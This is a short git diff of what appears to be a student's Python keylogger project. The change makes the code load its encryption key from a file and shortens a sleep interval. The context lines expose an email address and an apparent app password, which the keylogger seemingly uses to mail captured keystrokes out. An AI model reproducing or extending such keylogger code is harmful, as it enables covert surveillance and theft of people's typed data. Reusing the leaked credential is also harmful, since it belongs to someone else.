@@ -30,8 +30,11 @@ keys = []
 
 
 file_path = "C:\\Users\\Harish\\OneDrive\\College\\cybersecurity-projects\\KEYLOGGER\\project\\"
+key_path = "C:\\Users\\Harish\\OneDrive\\College\\cybersecurity-projects\\KEYLOGGER\\cryptography\\encryption_key"
 
-key = "NG2C0jvomx62ldZ3cKdfPl4BKLo1kC5m52VRL20k_Qk="
+with open(key_path, "rb") as file:
+    key = file.read()
+
 
 email_address = "mydummycyber@gmail.com"
 password = "naiy atru kgsg qeix"
@@ -205,4 +208,4 @@ while(iterations < num_of_iterations):
         currentTime = time.time()
         stopTime = time.time() + time_iteration
 
-time.sleep(35)
+time.sleep(5)
